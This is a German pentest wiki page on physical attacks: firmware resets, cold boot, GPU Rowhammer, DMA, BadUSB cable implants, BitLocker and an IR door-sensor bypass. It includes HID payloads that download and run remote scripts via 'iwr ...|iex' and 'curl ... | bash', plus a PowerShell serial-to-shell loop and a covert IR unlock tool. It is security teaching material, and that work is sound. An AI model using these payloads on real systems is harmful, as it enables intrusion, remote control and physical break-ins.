# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

## BIOS-Passwortwiederherstellung und Systemsicherheit

Die Einstellungen älterer PC-Firmware lassen sich möglicherweise zurücksetzen, indem die CMOS-Batterie getrennt oder ein dokumentierter Clear-CMOS-Jumper verwendet wird. Wie lange das Gerät dafür ausgeschaltet sein muss, hängt vom Mainboard ab. Moderne UEFI-Passwörter oder -Schlüssel können im nichtflüchtigen Flash-Speicher, in einem Embedded Controller oder in einem Sicherheitsgerät gespeichert sein und daher auch nach dem Entfernen der Batterie erhalten bleiben. Konsultieren Sie das Handbuch des Mainboards oder Servicehandbuch, bevor Sie Pins kurzschließen. Dieses Vorgehen kann außerdem TPM-Messwerte ungültig machen und eine Wiederherstellung der Festplattenverschlüsselung auslösen.

Auf älteren x86-Systemen können Tools wie **killCMOS** und **CmosPwd** CMOS-gestützte Einstellungen aus einer bootfähigen Umgebung auslesen oder ändern. CmosPwd erkennt Passwortformate aus einer dokumentierten Auswahl älterer BIOS-Familien und kann den CMOS-Zustand sichern, wiederherstellen oder löschen. Die veröffentlichten Builds sind für ältere DOS-/Windows-, Linux-, FreeBSD- und NetBSD-Umgebungen vorgesehen.<sup>[[18]](#references)</sup> Diese Dienstprogramme sind keine universellen UEFI-Passwortentferner und erfordern ausreichenden Zugriff auf Hardware und Firmware.

Manche Laptop-Firmware zeigt nach mehreren fehlgeschlagenen Passwortversuchen einen herstellerspezifischen Challenge-Code an. Datenbanken wie [bios-pw.org](https://bios-pw.org) können für einige Modelle ältere herstellerspezifische Wiederherstellungspasswörter ableiten. Viele Systeme setzen jedoch eine Sperre, ohne dass sich aus dem Challenge-Code ein Passwort ableiten lässt. Betrachten Sie jedes generierte Passwort als modellspezifisch und vermeiden Sie es, permanente Versuchsbegrenzungen auszuschöpfen.

### UEFI-Sicherheit

Bei modernen **UEFI**-Systemen kann CHIPSEC den Schutz von Secure-Boot-Variablen überprüfen. Beginnen Sie mit der nicht modifizierenden Prüfung unten. Der optionale Modus `-a modify` versucht absichtlich, Variablen zu beschädigen, und sollte nur auf einem wiederherstellbaren Laborsystem verwendet werden. CHIPSEC selbst warnt, dass sein privilegierter Treiber und sein hardware-naher Zugriff für Produktionsendpunkte ungeeignet sind.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-Analyse und Cold-Boot-Angriffe

DRAM verliert nicht sofort jedes Bit, wenn die Refresh-Zyklen ausbleiben. Die Zerfallsrate variiert erheblich je nach Modultyp und Temperatur; durch Kühlung lassen sich nützliche Daten viel länger erhalten als bei einem ungekühlten Aus- und Wiedereinschalten. Bei einem Cold-Boot-Angriff wird das System schnell in eine kleine Erfassungsumgebung neu gestartet oder ein gekühltes Modul übertragen, der Rohspeicher erfasst und trotz Bitverlusts werden kryptografische Schlüssel rekonstruiert. Ein Dienstprogramm zum Kopieren von Datenträgern ist nicht automatisch ein Tool zur Erfassung des physischen Speichers, und Volatility analysiert eine Erfassung, statt sie durchzuführen; verwenden Sie ein für die Plattform geeignetes, validiertes Erfassungstool.<sup>[[12]](#references)</sup>

---

## GPU-Rowhammer gegen Seitentabellen

Moderne GPU-Rowhammer-Angriffe werden deutlich wirksamer, wenn sie **GPU-Metadaten des virtuellen Speichers** statt gewöhnlicher Puffer angreifen. Neuere Arbeiten zu **GDDR6-NVIDIA-Ampere-GPUs** zeigen, dass ein Angreifer mit nicht privilegiertem CUDA-Code GPU-spezifische Hammering-Muster erstellen, mithilfe von **Memory Massaging** Seitenstrukturen in anfälligen Zeilen platzieren und dann Bits in der **Seitentabelle der letzten Ebene** oder einem zwischengeschalteten **Seitenverzeichnis** umkippen kann. Sobald ein einzelner Übersetzungseintrag beschädigt ist, kann der Angreifer **beliebige GPU-Speicher-Lese-/Schreibzugriffe** herstellen und anschließend zum Kompromittieren des Hosts übergehen.<sup>[[1]](#references)[[2]](#references)</sup>

### Ausnutzungsmuster

1. **Hammerbare Zeilen profilieren** in GDDR6 und refresh-bewusste/nicht uniforme Hammering-Muster erstellen, die DRAM-interne Gegenmaßnahmen umgehen.
2. **GPU-Speicherzuweisungen massieren**, sodass der Treiber Übersetzungsstrukturen für Seiten an hammerbaren physischen Speicherorten platziert, statt sie im standardmäßig geschützten Pool zu belassen. In der Praxis kann dies bedeuten, den Low-Memory-Bereich für Seitentabellen zu erschöpfen und große, dünn belegte UVM-Zuordnungen mit kontrollierten Abständen zu verteilen.
3. **Übersetzungsmetadaten umkippen**, etwa **PFN**- oder aperturebezogene Bits in einem Seitentabellen-/Seitenverzeichniseintrag, sodass die vom Angreifer kontrollierte virtuelle Seite auf Seiten mit Seitentabellen, beliebigen GPU-Speicher oder für den Host sichtbare Systemzuordnungen verweist.
4. Die gefälschte Zuordnung wiederverwenden, um weitere Übersetzungseinträge umzuschreiben und **beliebige GPU-Speicher-Lese-/Schreibzugriffe** über GPU-Kontexte hinweg zu erlangen.

### Übergang zum Host und Gegenmaßnahmen

- Bei **deaktiviertem IOMMU** können gefälschte System-Aperture-Zuordnungen beliebigen **physischen Host-Speicher** für die GPU zugänglich machen und so aus dem GPU-Primitiv eine vollständige Kompromittierung des Hosts ermöglichen.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** zielt auf Seitentabelleneinträge der letzten Ebene, während **GeForge** zeigt, dass die Beschädigung einer Ebene des Seitenverzeichnisses einfacher sein kann, weil ein einzelner Bit-Flip einen größeren Übersetzungs-Teilbaum umleiten kann. Betrachten Sie nicht nur eine einzige Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bleibt relevant, da sie den direkten Zugriff auf beliebigen Host-Speicher blockiert, den GDDRHammer/GeForge nutzen. Sie ist jedoch **keine vollständige Gegenmaßnahme**. **GPUBreach** zeigt einen Übergang in einer zweiten Phase: Der Angreifer beschädigt vom Treiber verwaltete, GPU-beschreibbare CPU-Puffer und löst dann Fehler in der Speichersicherheit des NVIDIA-Treibers aus, um einen Kernel-Schreibzugriff und selbst bei aktiviertem IOMMU eine **Root-Shell** zu erlangen.<sup>[[3]](#references)</sup>
- **Systemweites ECC** ist eine praktische Härtungsmaßnahme für unterstützte Workstation-/Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Abwehr.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1,171** Bit-Flips auf einer RTX 3060 und **202** auf einer RTX A6000. Das reichte aus, um eine funktionierende Kette zur Rechteausweitung auf dem Host aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct-Memory-Access-Angriffe (DMA)

Informationen zum Offline-Patching von UEFI IFR/NVRAM, mit dem sich die IOMMU-Durchsetzung vor dem Start herabstufen und eine Windows-DMA-Angriffskette ermöglichen lässt, finden Sie hier:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstriert die **DMA-basierte Speichererfassung und -manipulation** über Schnittstellen wie FireWire und frühe Thunderbolt-Konfigurationen, einschließlich historischer Signaturen zur Umgehung der Anmeldung. Es ist nicht einfach „gegen Windows 10 wirkungslos“: Die Ausnutzbarkeit hängt von der Schnittstelle, dem Ziel-Build, der IOMMU-Richtlinie, dem Sperrzustand sowie davon ab, ob Windows Kernel DMA Protection unterstützt und aktiviert ist. Windows 10 Version 1803 und höher führte Kernel DMA Protection auf kompatiblen Plattformen ein und veränderte damit die Angriffsfläche erheblich.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live-CD/USB für Systemzugriff

Bei einem unverschlüsselten oder bereits entsperrten Windows-Volume kann eine Offline-Umgebung Bedienungshilfen-Binärdateien wie **sethc.exe** oder **Utilman.exe** durch **cmd.exe** ersetzen. Wird dann die entsprechende Tastenkombination auf dem Anmeldebildschirm gedrückt, erhält man eine SYSTEM-Eingabeaufforderung. Tools wie **chntpw** können Daten lokaler SAM-Konten bearbeiten. Diese Methoden umgehen kein gesperrtes BitLocker-Volume und können mit DPAPI/EFS geschützte Anmeldedaten beschädigen; bewahren Sie forensische Kopien und Backups auf.

**Kon-Boot** ist ein kommerzielles Tool zur Umgehung der Authentifizierung beim Systemstart für unterstützte Windows-/macOS-Konfigurationen. Die Kompatibilität hängt vom Betriebssystem, Firmwaremodus, Secure Boot und der Festplattenverschlüsselung ab; ein mit BitLocker gesperrtes Volume wird damit nicht entschlüsselt.<sup>[[10]](#references)</sup>

---

## Umgang mit Windows-Sicherheitsfunktionen

### Start- und Wiederherstellungsverknüpfungen

- **Entf/Supr**, F2, F10 oder eine andere herstellerspezifische Taste öffnet möglicherweise das Firmware-Setup.
- **F8** öffnet die erweiterten Startoptionen älterer Windows-Versionen nur bei Konfigurationen, in denen dieser Weg weiterhin aktiviert ist; der aktuelle Zugriff auf die Wiederherstellungsoptionen variiert.
- Das Gedrückthalten von **Shift** kann bei manchen Konfigurationen die automatische Windows-Anmeldung unterdrücken. Richtlinien-/Registrierungseinstellungen können dieses Verhalten jedoch deaktivieren.<sup>[[17]](#references)</sup>

### BAD-USB-Geräte

Geräte wie **USB Rubber Ducky** und Teensy-Boards können sich als vertrauenswürdige HID-Tastaturen anmelden und vordefinierte Tastenanschläge eingeben. Die Payload verfügt zunächst über die Rechte und den Desktopzugriff der angemeldeten Sitzung; UAC-Eingabeaufforderungen, Bildschirmsperre, Tastaturlayout, Timing und USB-Richtlinien für Endgeräte schränken sie weiterhin ein.<sup>[[15]](#references)</sup>

Programmierbare Peripheriegeräte können außerdem Parser des Host-Kernels angreifen und mehrere USB-Geräte für Heap Grooming und die Offenlegung von Informationen koordinieren:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administratoren oder Benutzer mit Backup-Rechten können Schattenkopien erstellen oder Registrierungs-Hives speichern, um gesperrte Dateien wie **SAM** und **SYSTEM** zu erfassen. Dies ist eine Technik zur Datensammlung nach einer Kompromittierung, keine Rechteausweitung. Die Aktivität sollte mit Ereignissen zu `diskshadow`/VSS und zum Export von Registrierungs-Hives abgeglichen werden.

## BadUSB-/HID-Implantat-Techniken

### NFC-ausgelöstes Android-HID-Gadget

Ein gerootetes Android-Telefon kann nur dann zu einer programmierbaren USB-Tastatur werden, wenn USB-Controller und Kernel **USB-Gadget-/HID-Unterstützung** bieten. Auf kompatiblen Geräten stellt Kali NetHunter Gadget-Profile über **USB Arsenal** bereit. Eine weitere Option ist [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), das ConfigFS-Gadget-Funktionen erstellt und Tastatur-/Maus-Zeichengeräte wie `/dev/hidg0` und `/dev/hidg1` bereitstellen kann. Das Tool erstellt nur den Gadget-Endpunkt; ein separater Prozess muss HID-Berichte an ihn schreiben. Root-Zugriff kann einen Kernel ohne ConfigFS, HID-Gadget-Unterstützung oder einen nutzbaren USB Device Controller nicht ausgleichen.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Dieser Endpunkt lässt sich mit Android-NFC als physischem Auslöser kombinieren. Die App [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) liest die UID eines Tags, wandelt sie in das erwartete Format um, prüft sie anhand einer lokalen Zulassungsliste und sendet bei Übereinstimmung eine konfigurierte Tastatursequenz im Rubber-Ducky-Stil. Der verbundene Host sieht gewöhnliche Tastatureingaben und benötigt keine NFC-Software.<sup>[[22]](#references)[[24]](#references)</sup>

Testen Sie die Geräteerkennung und das Tastaturlayout in einem leeren Texteditor, bevor Sie Tastenkombinationen oder Befehle verwenden. Eine harmlose Payload lautet:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Wichtige Vertrauensgrenzen:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Eine **UID-Whitelist dient der Identifizierung, nicht der Authentifizierung**. UIDs sind öffentlich, und einige Token-Typen oder Emulatoren ermöglichen Klonen oder Identitätsvortäuschung. Eine kopierte zulässige UID durchläuft denselben Verarbeitungsweg wie das Original-Token.
- Das Magisk-Modul **NfcScreenOff** patcht den NFC-Dienst, sodass dieser sich verhält, als wäre der Bildschirm eingeschaltet und entsperrt. Ist das Telefon bereits mit einem Host verbunden, kann dadurch jemand den Payload auslösen, ohne das Telefon zu entsperren.
- Passwörter, API-Tokens und im Payload gespeicherte Befehle sind auf einem gerooteten Gerät oder einem Gerät mit entsperrtem Bootloader wiederherstellbare Geheimnisse. Ein Passwort per HID einzugeben ist die Automatisierung der Wiederverwendung eines Passworts, keine passwortlose Authentifizierung.
- HID-Injection wird mit den Berechtigungen des aktiven Desktops ausgeführt und hängt von Fokus, Timing und dem Tastaturlayout des Hosts ab. Verlange vor dem Ausführen sensibler Aktionen eine kürzlich erfolgte Bestätigung durch den Benutzer, vermeide privilegierte Geheimnisse in Skripten und verwende für echte Authentifizierung einen kryptografischen Challenge-Response-Authenticator.

### Wi-Fi-gesteuerte Kabelimplantate

- ESP32-S3-basierte Implantate wie **Evil Crow Cable Wind** verstecken sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, melden sich ausschließlich als USB-Tastatur an und stellen ihren C2-Stack über Wi-Fi bereit. Der Angreifer muss das Kabel nur über den Host des Opfers mit Strom versorgen, einen Hotspot mit dem Namen `Evil Crow Cable Wind` und dem Passwort `123456789` einrichten und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.<sup>[[8]](#references)</sup>
- Die Browseroberfläche bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads sind nach Betriebssystem gekennzeichnet, Tastaturlayouts lassen sich spontan umstellen und VID/PID-Zeichenfolgen können geändert werden, um bekannte Peripheriegeräte nachzuahmen.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads bereitstellen, ihre Ausführung auslösen und Wi-Fi-Zugangsdaten verwalten, ohne das Netzwerk der Organisation zu nutzen – nützlich bei physischen Eindringversuchen mit kurzer Verweildauer.

### Betriebssystembewusste AutoExec-Payloads

- AutoExec-Regeln verknüpfen einen oder mehrere Payloads, die unmittelbar nach der USB-Anmeldung ausgeführt werden. Das Implantat führt eine einfache Betriebssystemerkennung durch und wählt das passende Skript aus.
- Beispielablauf:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann schon das Austauschen eines Ladekabels den ersten Zugriff per „plug-and-pwn“ im Kontext des angemeldeten Benutzers ermöglichen.

### HID-bootstrapped Remote Shell über Wi-Fi TCP

1. **Tastatureingabe-Bootstrap:** Ein gespeicherter Payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was über das neue USB-Seriellgerät eingeht. Eine minimale Windows-Variante lautet:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kabelbrücke:** Das Implantat hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) startet, der eine Verbindung zurück zum Operator herstellt. Alle in die TCP-Sitzung eingegebenen Bytes werden in die obige serielle Schleife weitergeleitet. So ist auch auf Air-Gap-Hosts Remote Command Execution möglich. Die Ausgabe ist begrenzt, daher führen Operatoren meist Blindbefehle aus (z. B. Kontoerstellung, Bereitstellung zusätzlicher Tools).

### HTTP-OTA-Update-Angriffsfläche

- Die dokumentierte Evil Crow Cable Wind-Schnittstelle stellt unter `/update` einen nicht authentifizierten Firmware-Update-Endpunkt bereit:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Außendienstmitarbeiter können Funktionen während eines Einsatzes im laufenden Betrieb austauschen (z. B. USB Army Knife-Firmware flashen), ohne das Kabel zu öffnen. So kann das Implantat neue Fähigkeiten nutzen, während es weiterhin mit dem Zielhost verbunden ist.

## BitLocker-Verschlüsselung umgehen

Eine autorisierte forensische Erfassung eines laufenden oder kürzlich verwendeten Systems kann einen BitLocker-Volume-Master-Key oder zugehöriges Schlüsselmaterial enthalten, solange das Volume entsperrt ist. Kommerzielle Tools wie Elcomsoft Forensic Disk Decryptor und Passware Kit Forensic können unterstützte Speicherabbilder, Ruhezustandsdateien oder Crash-Dumps durchsuchen, doch der Erfolg ist nicht garantiert. Moderne Windows-Versionen verschlüsseln Crash-Dumps außerdem, wenn BitLocker aktiviert ist. Ein gespeichertes 48-stelliges Wiederherstellungspasswort ist ein anderer Artefakt als ein im Arbeitsspeicher befindlicher Volume-Key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein Angreifer, der einen Administrator dazu überredet, BitLocker-Verwaltungsbefehle auszuführen, kann einen Wiederherstellungspasswort-, externen Schlüssel- oder anderen Protector hinzufügen und anschließend abfangen. Ein Wiederherstellungspasswort kann keine beliebige Folge von Nullen sein: Numerische BitLocker-Wiederherstellungspasswörter müssen ein geprüftes 48-stelliges Format haben. Die relevante Syntax für die autorisierte Verwaltung lautet `manage-bde -protectors -add C: -recoverypassword`; die hinzugefügten Protectors lassen sich mit `manage-bde -protectors -get C:` auflisten. Überwachen Sie das Hinzufügen von Protectors und stellen Sie sicher, dass neues Wiederherstellungsmaterial nur an genehmigten Speicherorten hinterlegt wird.<sup>[[16]](#references)</sup>

---

## BIOS auf Werkseinstellungen zurücksetzen, indem Chassis-Intrusion-/Wartungsschalter ausgenutzt werden

Viele moderne Laptops und Desktop-PCs im Small-Form-Factor-Format verfügen über einen **Chassis-Intrusion-Schalter**, der vom Embedded Controller (EC) und der BIOS-/UEFI-Firmware überwacht wird. Der Schalter soll vor allem einen Alarm auslösen, wenn ein Gerät geöffnet wird. Manche Hersteller implementieren jedoch eine **nicht dokumentierte Wiederherstellungsfunktion**, die durch ein bestimmtes Schaltmuster ausgelöst wird.<sup>[[5]](#references)[[6]](#references)</sup>

### So funktioniert der Angriff

1. Der Schalter ist mit einem **GPIO-Interrupt** am EC verbunden.
2. Auf dem EC laufende Firmware erfasst **Zeitpunkt und Anzahl der Betätigungen**.
3. Erkennt der EC ein fest einprogrammiertes Muster, ruft er eine *mainboard-reset*-Routine auf, die **den Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Start laden betroffene Modelle einen zurückgesetzten Firmware-Zustand. Je nach Hersteller und Revision kann der gelöschte Zustand ein Supervisor-Passwort, benutzerdefinierte Boot-Einstellungen oder registrierte Secure-Boot-Schlüssel umfassen. Auswirkungen auf TPM und Festplattenverschlüsselung müssen separat bewertet werden.

> Ein Firmware-Reset kann externe Boot-Optionen wiederherstellen, entschlüsselt aber **nicht** den Datenträger. BitLocker oder ein anderes System zur vollständigen Festplattenverschlüsselung kann nach Änderungen am TPM oder an der Firmware in den Wiederherstellungsmodus wechseln und das interne Laufwerk weiterhin ohne Wiederherstellungsschlüssel schützen.<sup>[[16]](#references)</sup>

### Praxisbeispiel – Framework 13-Laptop

Die Wiederherstellungsfunktion des Framework 13 (11./12./13. Generation) wird so ausgelöst:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nach dem zehnten Zyklus setzt der EC ein Flag, das das BIOS anweist, beim nächsten Neustart den NVRAM zu löschen. Der gesamte Vorgang dauert etwa 40 Sekunden und erfordert **nichts weiter als einen Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeines Exploit-Verfahren

1. Schalte das Zielgerät ein oder versetze es in den Ruhezustand und reaktiviere es, damit der EC läuft.
2. Entferne die Bodenabdeckung, um den Intrusion-/Wartungsschalter freizulegen.
3. Wiederhole das herstellerspezifische Umschaltmuster (sieh in Dokumentationen oder Foren nach oder reverse-engineere die EC-Firmware).
4. Baue das Gerät wieder zusammen und starte es neu. Prüfe anschließend, welche Firmware-Einstellungen und Zugangsdaten sich tatsächlich geändert haben.
5. Falls autorisiert und externes Booten möglich ist, starte ein kontrolliertes Live-Image. Sobald ein internes Volume rechtmäßig entsperrt wurde (oder nie verschlüsselt war), kann die Live-Umgebung Zugangsdaten und Daten auslesen oder die EFI-Systempartition untersuchen. Änderungen an dieser Partition zur Installation eines EFI-Implants sind persistent und höchst invasiv. Sie unterliegen weiterhin den Einschränkungen durch Secure Boot, Measured Boot, Firmware-Schreibschutz und Endpoint-Monitoring. Verschlüsselter Speicher bleibt ohne Schlüssel oder Wiederherstellungsmaterial unzugänglich.

### Erkennung und Abwehr

* Protokolliere Gehäuseöffnungsvorfälle in der OS-Verwaltungskonsole und korreliere sie mit unerwarteten BIOS-Resets.
* Verwende **manipulationssichere Siegel** an Schrauben und Abdeckungen, um ein Öffnen zu erkennen.
* Bewahre Geräte in **physisch gesicherten Bereichen** auf; gehe davon aus, dass physischer Zugriff einer vollständigen Kompromittierung gleichkommt.
* Deaktiviere, sofern verfügbar, die Funktion „maintenance switch reset“ des Herstellers oder verlange für NVRAM-Resets eine zusätzliche kryptografische Autorisierung.

---

## Verdeckte IR-Injektion gegen berührungslose Ausgangssensoren

### Sensoreigenschaften
- Gängige „wave-to-exit“-Sensoren kombinieren einen Nahinfrarot-LED-Sender mit einem Empfängermodul wie in einer TV-Fernbedienung. Dieses meldet erst dann ein Logik-High, wenn es mehrere Impulse (~4–10) mit der korrekten Trägerfrequenz (≈30 kHz) erkannt hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffblende verhindert, dass Sender und Empfänger direkt aufeinander gerichtet sind. Daher nimmt die Steuerung an, dass ein erkanntes Trägersignal von einer nahen Reflexion stammt, und schaltet ein Relais, das den Türöffner betätigt.
- Sobald die Steuerung ein Ziel erkannt hat, ändert sie oft die Modulationshüllkurve des Sendesignals. Der Empfänger akzeptiert jedoch weiterhin alle Impulsfolgen, die zur gefilterten Trägerfrequenz passen.

### Angriffsablauf
1. **Erfasse das Aussendeprofil** – Schließe einen Logikanalysator an den Steuerungspins an, um die Wellenformen vor und nach der Erkennung aufzuzeichnen, mit denen die interne IR-LED angesteuert wird.
2. **Spiele nur die Wellenform „nach der Erkennung“ ab** – Entferne oder ignoriere den Originalsender und steuere eine externe IR-LED von Anfang an mit dem Muster an, das normalerweise erst nach der Erkennung ausgegeben wird. Da der Empfänger nur Impulszahl und Frequenz berücksichtigt, behandelt er den gefälschten Träger als echte Reflexion und aktiviert die Relaisleitung.
3. **Steuere die Übertragung** – Sende den Träger in abgestimmten Impulsfolgen (z. B. einige zehn Millisekunden an, ähnlich lange aus), um die Mindestimpulszahl zu erreichen, ohne die AGC des Empfängers oder dessen Interferenzlogik zu überlasten. Dauerhafte Aussendung macht den Sensor schnell unempfindlich und verhindert, dass das Relais schaltet.

### Injektion über große Entfernung durch Reflexion
- Ein leistungsstarker IR-Diodenstrahler mit MOSFET-Treiber und Fokussieroptik ermöglicht zuverlässiges Auslösen aus einer Entfernung von etwa 6 m.
- Der Angreifer benötigt keine direkte Sichtlinie zur Empfängeröffnung. Wird der Strahl auf Innenwände, Regale oder Türrahmen gerichtet, die durch Glas sichtbar sind, kann reflektierte Energie in das Sichtfeld von ~30° gelangen und eine Handbewegung aus kurzer Entfernung nachahmen.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Oberflächen reflektiert werden und dennoch über der Erkennungsschwelle bleiben.

### Zur Waffe umgebaute Angriffstaschenlampe
- Wird der Treiber in eine handelsübliche Taschenlampe eingebaut, fällt das Werkzeug kaum auf. Ersetze die sichtbare LED durch eine leistungsstarke IR-LED, die zum Frequenzband des Empfängers passt, ergänze einen ATtiny412 (oder ähnlichen Mikrocontroller) zur Erzeugung der Impulse bei ≈30 kHz und verwende einen MOSFET, um den LED-Strom abzuleiten.
- Ein Teleskop-Zoomobjektiv bündelt den Strahl für mehr Reichweite und Präzision. Ein vom Mikrocontroller gesteuerter Vibrationsmotor gibt haptische Rückmeldung, wenn die Modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Das Durchschalten mehrerer gespeicherter Modulationsmuster (mit leicht unterschiedlichen Trägerfrequenzen und Hüllkurven) verbessert die Kompatibilität mit umgelabelten Sensorfamilien. So kann der Anwender reflektierende Oberflächen absuchen, bis das Relais hörbar klickt und die Tür entriegelt.

---

## References

- [1] [GDDRHammer: DRAM-Zeilen massiv stören — Rowhammer-Angriffe über Komponenten hinweg mit modernen GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-Speicher bearbeiten, um GPU-Seitentabellen zu fälschen – zum Spaß und Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilegieneskalationsangriffe auf GPUs mit Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA – Sicherheitshinweis: Rowhammer – Juli 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Hier drücken, um zu pwnen“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anleitung zum Mainboard-Reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Umgehung berührungsloser IR-Ausgangssensoren mit einer verdeckten IR-Taschenlampe“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Einstecken, starten, pwnen: Hacking mit Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier – Rowhammer-Angriff auf NVIDIA-Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Offizielle Dokumentation und Kompatibilitätsinformationen zu Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC-Dokumentation – Secure-Boot-Variablenschutz](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Damit wir uns erinnern: Cold-Boot-Angriffe auf Verschlüsselungsschlüssel](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception – Manipulation des physischen Speichers über DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn – Kernel-DMA-Schutz](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentation zu Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn – BitLocker-Betriebsanleitung](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn – Verhalten beim Gedrückthalten der Umschalttaste und bei der automatischen Anmeldung](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity – Dokumentation und Downloads zu CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali-Linux-Dokumentation – NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-Kernel-Dokumentation – USB-HID-Gadget-Treiber](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB-Gadget-Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Ein gerootetes Android-Telefon in einen NFC-Authentifikator und ein Automatisierungstool für den PC verwandeln](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
